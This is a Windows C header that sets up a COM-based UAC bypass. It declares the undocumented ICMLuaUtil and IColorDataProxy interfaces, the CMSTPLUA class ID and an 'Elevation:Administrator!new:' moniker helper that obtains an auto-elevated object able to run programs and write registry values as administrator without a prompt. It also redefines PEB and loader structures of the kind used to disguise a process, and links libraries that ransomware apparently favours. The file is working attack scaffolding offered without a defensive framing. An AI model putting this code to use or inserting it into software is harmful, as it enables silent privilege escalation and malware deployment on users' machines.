#pragma once

#pragma comment(lib, "Rstrtmgr.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "mpr.lib")

#include <Windows.h>
#include <ntstatus.h>
#include <CommCtrl.h>
#include <shlobj.h>
#include <AccCtrl.h>
#include <winternl.h>
#include <Psapi.h>
#include <AclAPI.h>
#include <VersionHelpers.h>
#include <RestartManager.h>
#include <lmcons.h>

#define NTDLL_DLL_NAME L"ntdll.dll"

#define UCM_DEFINE_GUID(name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8) \
     EXTERN_C const GUID DECLSPEC_SELECTANY name \
                = { l, w1, w2, { b1, b2,  b3,  b4,  b5,  b6,  b7,  b8 } }  

UCM_DEFINE_GUID(IID_ICMLuaUtil, 0x6EDD6D74, 0xC007, 0x4E75, 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C);

#define T_ELEVATION_MONIKER_ADMIN   L"Elevation:Administrator!new:"
#define T_CLSID_CMSTPLUA            L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"

typedef interface IColorDataProxy IColorDataProxy;
typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct IColorDataProxyVtbl {

    BEGIN_INTERFACE

        HRESULT(STDMETHODCALLTYPE* QueryInterface)(
            __RPC__in IColorDataProxy* This,
            __RPC__in REFIID riid,
            _COM_Outptr_  void** ppvObject);

    ULONG(STDMETHODCALLTYPE* AddRef)(
        __RPC__in IColorDataProxy* This);

    ULONG(STDMETHODCALLTYPE* Release)(
        __RPC__in IColorDataProxy* This);

    HRESULT(STDMETHODCALLTYPE* Method1)(
        __RPC__in IColorDataProxy* This);

    HRESULT(STDMETHODCALLTYPE* Method2)(
        __RPC__in IColorDataProxy* This);

    HRESULT(STDMETHODCALLTYPE* Method3)(
        __RPC__in IColorDataProxy* This);

    HRESULT(STDMETHODCALLTYPE* Method4)(
        __RPC__in IColorDataProxy* This);

    HRESULT(STDMETHODCALLTYPE* Method5)(
        __RPC__in IColorDataProxy* This);

    HRESULT(STDMETHODCALLTYPE* Method6)(
        __RPC__in IColorDataProxy* This);

    HRESULT(STDMETHODCALLTYPE* Method7)(
        __RPC__in IColorDataProxy* This);

    HRESULT(STDMETHODCALLTYPE* Method8)(
        __RPC__in IColorDataProxy* This);

    HRESULT(STDMETHODCALLTYPE* Method9)(
        __RPC__in IColorDataProxy* This);

    HRESULT(STDMETHODCALLTYPE* Method10)(
        __RPC__in IColorDataProxy* This);

    HRESULT(STDMETHODCALLTYPE* Method11)(
        __RPC__in IColorDataProxy* This);

    HRESULT(STDMETHODCALLTYPE* LaunchDccw)(
        __RPC__in IColorDataProxy* This,
        _In_      HWND hwnd);

    END_INTERFACE

} *PIColorDataProxyVtbl;

typedef struct ICMLuaUtilVtbl {

    BEGIN_INTERFACE

        HRESULT(STDMETHODCALLTYPE* QueryInterface)(
            __RPC__in ICMLuaUtil* This,
            __RPC__in REFIID riid,
            _COM_Outptr_  void** ppvObject);

    ULONG(STDMETHODCALLTYPE* AddRef)(
        __RPC__in ICMLuaUtil* This);

    ULONG(STDMETHODCALLTYPE* Release)(
        __RPC__in ICMLuaUtil* This);

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE* SetRasCredentials)(
        __RPC__in ICMLuaUtil* This);

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE* SetRasEntryProperties)(
        __RPC__in ICMLuaUtil* This);

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE* DeleteRasEntry)(
        __RPC__in ICMLuaUtil* This);

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE* LaunchInfSection)(
        __RPC__in ICMLuaUtil* This);

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE* LaunchInfSectionEx)(
        __RPC__in ICMLuaUtil* This);

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE* CreateLayerDirectory)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* ShellExec)(
        __RPC__in ICMLuaUtil* This,
        _In_     LPCTSTR lpFile,
        _In_opt_  LPCTSTR lpParameters,
        _In_opt_  LPCTSTR lpDirectory,
        _In_      ULONG fMask,
        _In_      ULONG nShow);

    HRESULT(STDMETHODCALLTYPE* SetRegistryStringValue)(
        __RPC__in ICMLuaUtil* This,
        _In_      HKEY hKey,
        _In_opt_  LPCTSTR lpSubKey,
        _In_opt_  LPCTSTR lpValueName,
        _In_      LPCTSTR lpValueString);

    HRESULT(STDMETHODCALLTYPE* DeleteRegistryStringValue)(
        __RPC__in ICMLuaUtil* This,
        _In_      HKEY hKey,
        _In_      LPCTSTR lpSubKey,
        _In_      LPCTSTR lpValueName);

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE* DeleteRegKeysWithoutSubKeys)(
        __RPC__in ICMLuaUtil* This);

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE* DeleteRegTree)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* ExitWindowsFunc)(
        __RPC__in ICMLuaUtil* This);

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE* AllowAccessToTheWorld)(
        __RPC__in ICMLuaUtil* This);

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE* CreateFileAndClose)(
        __RPC__in ICMLuaUtil* This);

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE* DeleteHiddenCmProfileFiles)(
        __RPC__in ICMLuaUtil* This);

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE* CallCustomActionDll)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* RunCustomActionExe)(
        __RPC__in       ICMLuaUtil* This,
        _In_            LPCTSTR lpFile,
        _In_opt_        LPCTSTR lpParameters,
        _COM_Outptr_    LPCTSTR* pszHandleAsHexString);

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE* SetRasSubEntryProperties)(
        __RPC__in ICMLuaUtil* This);

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE* DeleteRasSubEntry)(
        __RPC__in ICMLuaUtil* This);

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE* SetCustomAuthData)(
        __RPC__in ICMLuaUtil* This);

    END_INTERFACE

} *PICMLuaUtilVtbl;

interface IColorDataProxy { CONST_VTBL struct IColorDataProxyVtbl* lpVtbl; };
interface ICMLuaUtil { CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl; };

typedef NTSTATUS(NTAPI* pRtlEnterCriticalSection)(
    PRTL_CRITICAL_SECTION CriticalSection
    );

typedef NTSTATUS(NTAPI* pRtlLeaveCriticalSection)(
    PRTL_CRITICAL_SECTION CriticalSection
    );

typedef struct _FPEB
{
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsLegacyProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN SpareBits : 3;
        };
    };
    HANDLE Mutant;

    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
} FPEB, * PFPEB;

typedef struct _FLDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    union
    {
        UCHAR FlagGroup[4];
        ULONG Flags;
        struct
        {
            ULONG PackagedBinary : 1;
            ULONG MarkedForRemoval : 1;
            ULONG ImageDll : 1;
            ULONG LoadNotificationsSent : 1;
            ULONG TelemetryEntryProcessed : 1;
            ULONG ProcessStaticImport : 1;
            ULONG InLegacyLists : 1;
            ULONG InIndexes : 1;
            ULONG ShimDll : 1;
            ULONG InExceptionTable : 1;
            ULONG ReservedFlags1 : 2;
            ULONG LoadInProgress : 1;
            ULONG LoadConfigProcessed : 1;
            ULONG EntryProcessed : 1;
            ULONG ProtectDelayLoad : 1;
            ULONG ReservedFlags3 : 2;
            ULONG DontCallForThreads : 1;
            ULONG ProcessAttachCalled : 1;
            ULONG ProcessAttachFailed : 1;
            ULONG CorDeferredValidate : 1;
            ULONG CorImage : 1;
            ULONG DontRelocate : 1;
            ULONG CorILOnly : 1;
            ULONG ChpeImage : 1;
            ULONG ReservedFlags5 : 2;
            ULONG Redirected : 1;
            ULONG ReservedFlags6 : 2;
            ULONG CompatDatabaseProcessed : 1;
        };
    };
    USHORT ObsoleteLoadCount;
    USHORT TlsIndex;
    struct _LIST_ENTRY HashLinks;
    ULONG TimeDateStamp;
} FLDR_DATA_TABLE_ENTRY, * PFLDR_DATA_TABLE_ENTRY;

inline HRESULT ucmAllocateElevatedObject(_In_ LPWSTR lpObjectCLSID, _In_ REFIID riid, _In_ DWORD dwClassContext, _Outptr_ PVOID* ppv)
{
    BOOL bCond = FALSE;
    DWORD classContext;
    HRESULT hr = E_FAIL;
    PVOID ElevatedObject = NULL;

    BIND_OPTS3 bop;
    wchar_t szMoniker[MAX_PATH];

    do
    {
        if (wcslen(lpObjectCLSID) > 64)
            break;

        RtlSecureZeroMemory(&bop, sizeof(bop));
        bop.cbStruct = sizeof(bop);

        classContext = dwClassContext;
        if (dwClassContext == 0)
            classContext = CLSCTX_LOCAL_SERVER;

        bop.dwClassContext = classContext;
        lstrcpyW(szMoniker, T_ELEVATION_MONIKER_ADMIN);
        lstrcatW(szMoniker, lpObjectCLSID);

        hr = CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, &ElevatedObject);
    } while (bCond);

    *ppv = ElevatedObject;
    return hr;
}